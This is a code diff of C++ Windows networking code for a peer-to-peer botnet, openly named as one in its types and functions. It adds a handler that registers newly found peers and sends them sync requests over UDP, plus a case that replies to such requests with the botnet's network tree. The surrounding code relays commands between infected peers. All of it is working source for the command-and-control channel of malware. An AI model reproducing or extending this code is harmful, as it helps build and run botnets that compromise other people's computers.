@@ -1,5 +1,6 @@
 #include "Communication.h"
 
+#include <vector>
 #include <thread>
 #include <malloc.h>
 #include <WS2tcpip.h>
@@ -133,7 +134,7 @@ static void handle_command(u_char* const data, const struct sockaddr_in& src_add
 		send_command(data, BOTNET_PACK_SIZE);
 	else
 	{
-		bool path_status;
+		BOOL path_status;
 		command->numerics.id = botnet_topology.fowardCommand(command->numerics.id, src_addr);
 		struct sockaddr_in next_peer = botnet_topology.nextPathNode(command->dst_peer, command->private_peer, &path_status);
 		
@@ -175,6 +176,28 @@ static void keep_alive_reply(struct sockaddr_in& client)
 	sendto(udp_sock, (char*)&pack, BOTNET_PACK_SIZE, 0, (struct sockaddr*)&client, sizeof(client));
 }
 
+static void handle_peer_reply(const u_char* data)
+{
+	/* locals */
+	struct botnet_pack pack;
+	struct sockaddr_in peer;
+	BOOL status = 0;
+
+	/* add peer */
+	peer = botnet_topology.addPeer(data, &status);
+
+	// open udp session for direct communication
+	if (status)
+	{
+		/* create request */
+		ZeroMemory(&pack, BOTNET_PACK_SIZE);
+		pack.type = PACK_TYPE::NETWORK_SYNC_REQUEST;
+
+		/* send to peer */
+		sendto(udp_sock, (char*)&pack, BOTNET_PACK_SIZE, 0, (struct sockaddr*)&peer, sizeof(peer));
+	}
+}
+
 static int handle_udp_connections()
 {
 	/* locals */
@@ -182,6 +205,7 @@ static int handle_udp_connections()
 	struct botnet_pack* p = (struct botnet_pack*)data;
 	struct sockaddr_in client;
 	int client_size = sizeof(client);
+	std::vector<adr> hosts;
 
 	/* recv packet */
 	recvfrom(udp_sock, (char*)data, 1024, 0, (struct sockaddr*)&client, &client_size);
@@ -204,7 +228,10 @@ static int handle_udp_connections()
 	case PACK_TYPE::SYNC_REPLY:
 		break;
 	case PACK_TYPE::PEER_REPLY:
-		botnet_topology.addPeer(data, udp_sock);
+		handle_peer_reply(data);
+		break;
+	case PACK_TYPE::NETWORK_SYNC_REQUEST:
+		botnet_topology.sendNetTree(udp_sock, client, hosts ,(char*)data);
 		break;
 	case PACK_TYPE::NETWORK_SYNC:
 		botnet_topology.handleSync(data, client);
